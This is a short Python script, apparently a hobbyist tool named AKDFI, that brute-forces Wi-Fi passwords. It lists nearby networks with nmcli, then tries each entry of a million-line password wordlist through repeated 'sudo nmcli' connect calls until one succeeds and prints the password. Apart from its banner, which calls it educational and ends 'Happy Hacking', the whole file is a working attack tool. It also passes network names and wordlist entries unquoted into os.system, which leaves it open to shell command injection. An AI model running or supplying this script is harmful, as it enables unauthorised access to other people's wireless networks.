import os
print("""
      _________          __    ___     __________
     /  _____  \        |  |  /  /    |  ______  \
    /  /     \  \       |  |_/  /     | |      \   \
   /  /_______\  \      |      /      | |       \   \
  /  ___________  \     |   _  \      | |       /   /
 /  /           \  \    |  | \  \     | |______/   /
/__/             \__\   |__|  \__\    |___________/

""")
print("\n*****************************************************************")
print("\n* AKDFI                                                         *")
print("\n* Version 1.00                                                  *")
print("\n*****************************************************************")
print("\n*****************************************************************")
print("\n* Copyright of AKD, 2022                                        *")
print("\n* https://www.adarshkrdubay.github.io                           *")
print("\n*****************************************************************")
print("\n*****************************************************************")
print("\n* Please note that this code can be improved by using functions.*")
print("\n* It is not programmed to cater for all situations.             *")
print("\n* This code is provided for educational purposes only.          *")
print("\n* Do good. Be Ethical. Happy Hacking                            *")
print("\n*****************************************************************")

os.system("sudo nmcli d wifi list ifname wlp2s0 " )
wifiname=input("select the wifi you want to bruteforce")
password_list=[]
listfile=open("wordlists/10-million-password-list-top-1000000.txt","r")
for fill in listfile:
        password_list.append(fill.replace("\n",""))
for word in password_list:
                print(f"trying {word} as password ")
                os.system(f"sudo nmcli d wifi connect {wifiname} password {word} ifname wlp2s0 > con.txt")
                passcheek=open("con.txt","r")
                passcheek=passcheek.read()
                if "successfully" in passcheek:
                                print("Password cracked")
                                print(f"Password of '{wifiname}' is '{word}'")
                                exit()
                else:
                        print(f"{word} was not the password")
